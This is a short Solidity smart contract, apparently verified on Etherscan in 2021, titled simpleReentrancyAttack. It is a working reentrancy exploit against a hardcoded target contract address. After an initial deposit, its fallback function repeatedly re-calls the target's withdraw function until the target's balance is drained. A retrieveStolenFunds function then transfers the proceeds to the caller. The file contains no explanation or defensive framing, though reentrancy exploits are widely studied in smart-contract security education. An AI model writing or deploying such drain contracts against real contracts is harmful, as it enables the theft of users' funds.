/**
 *Submitted for verification at Etherscan.io on 2021-04-27
*/

interface targetInterface{
      function deposit() external payable; 
      function withdraw(uint withdrawAmount) external; 
    }
   
    contract simpleReentrancyAttack{
      targetInterface bankAddress = targetInterface(0xDD67A8B081eCfa00D677D07b86adB3DFB5D98f09); 
      uint amount = 0.1 ether; 
   
  function deposit() public payable{
    bankAddress.deposit.value(amount)();
  }
    
  function attack() public payable{
    bankAddress.withdraw(amount); 
  }
  
  function retrieveStolenFunds() public {
    msg.sender.transfer(address(this).balance);
  }
  
  fallback () external payable{ 
    if (address(bankAddress).balance >= amount){
         bankAddress.withdraw(amount);
    }   
  }
}